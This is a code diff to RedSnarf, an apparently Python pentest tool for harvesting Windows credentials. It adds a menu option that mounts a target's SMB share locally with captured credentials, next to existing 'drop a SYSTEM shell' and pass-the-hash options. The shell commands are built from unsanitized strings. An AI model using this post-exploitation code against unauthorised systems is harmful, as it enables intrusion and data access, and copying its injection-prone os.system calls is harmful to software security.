@@ -2147,7 +2147,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5g", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5h", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -4547,6 +4547,9 @@ if dropshell in yesanswers:
 				if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
 					print colored ('[+]Enter ','green')+ colored('SMBC','yellow')+colored(' to mount a share from ','green')+colored(outputpath+targets[0]+'/shares.txt','yellow')+colored(' with SMBClient','green')
 
+				if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
+					print colored ('[+]Enter ','green')+ colored('SMBL','yellow')+colored(' to mount a share from ','green')+colored(outputpath+targets[0]+'/shares.txt','yellow')+colored(' locally','green')
+
 				response = raw_input("\nWhat kind of shell would you like:? (q to quit) ")
 				if response.upper()=="S":	
 					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
@@ -4591,6 +4594,47 @@ if dropshell in yesanswers:
 					print colored("Mounting ",'yellow')+cshare+colored(" with SMBClient",'yellow')
 					
 					os.system("/usr/bin/pth-smbclient //"+targets[0]+"/"+cshare+" -W "+domain_name+" -U "+user+"%"+passw+" 2>/dev/null")
+					
+					sys.exit()
+				elif response.upper()=="SMBL":
+					print colored ('\n[+] Select a share ' +'\n','yellow')
+										
+					u = open(outputpath+targets[0]+'/shares.txt').read().splitlines()
+					for n in u:
+						if "READ/" in n:
+							allshares.append(n)
+					
+					allshares=list(set(allshares))
+					
+					for share in xrange(len(allshares)):
+						print "["+str(share)+"]"+allshares[share]
+
+					response = raw_input("\nEnter the number of the share you wish to mount locally:? ")
+
+					cshare=allshares[int(response)].split(",")[0]	
+					
+					print colored("\n[+]Mounting ",'yellow')+cshare+colored(" to ",'yellow')+outputpath+targets[0]+"/mnt"
+
+					if not os.path.isdir(outputpath+targets[0]+"/mnt"):
+						os.makedirs(outputpath+targets[0]+"/mnt")
+
+					#Check to see if we already have a share mounted
+					for l in file('/proc/mounts'):
+						if outputpath+targets[0]+"/mnt" in l:
+							print colored("[-]There is already a share already mounted to ",'yellow')+outputpath+targets[0]+"/mnt"
+							print colored("[!]"+l,'red')
+							print colored("[?]To unmount ",'blue')+"umount "+outputpath+targets[0]+"/mnt\n"
+							sys.exit()
+
+					#Mount share
+					os.system("mount -t cifs //"+targets[0]+"/"+cshare+" "+outputpath+targets[0]+"/mnt"+" -o username="+user+",password="+passw+",domain="+domain_name)
+					#print "mount -t cifs //"+targets[0]+"/"+cshare+" "+outputpath+targets[0]+"/mnt"+" -o username="+user+",password="+passw+",domain="+domain_name
+					
+					#Check to see if the share has mounted
+					for l in file('/proc/mounts'):
+						if outputpath+targets[0]+"/mnt" in l:
+							print colored("[+]Share mounted to ",'green')+outputpath+targets[0]+"/mnt"
+							print colored("[?]To unmount ",'blue')+"umount "+outputpath+targets[0]+"/mnt\n"
 					
 					sys.exit()
 				elif response.upper()=="Q":
